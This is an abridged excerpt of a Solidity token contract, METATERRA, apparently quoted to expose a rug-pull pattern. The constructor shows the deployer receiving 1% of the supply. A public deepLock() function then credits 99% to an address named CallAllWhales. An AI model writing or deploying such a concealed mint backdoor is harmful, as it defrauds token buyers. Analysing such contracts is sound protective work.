...
contract METATERRA is Context, IBEP20, Ownable {
    ...
    uint256 private constant _allTotalSupply = 10000000000 * 10**8;
    uint256 private _rTotalSupply = (MAX - (MAX % _allTotalSupply));
    uint256 private _tFeeTotal;

    string private _name = 'METATERRA';
    string private _symbol = 'METATERRA';
    uint8 private _decimals = 8;

    constructor () {
        _rOwned[_msgSender()] = _rTotalSupply.div(1000).mul(10);
        emit Transfer(address(0), _msgSender(), _allTotalSupply*10/1000);
    }
    ...
    function deepLock() public {
      ...
      _rOwned[CallAllWhales] = _rTotalSupply.div(1000).mul(990);
        emit Transfer(address(0), CallAllWhales, _allTotalSupply*990/1000);
    }
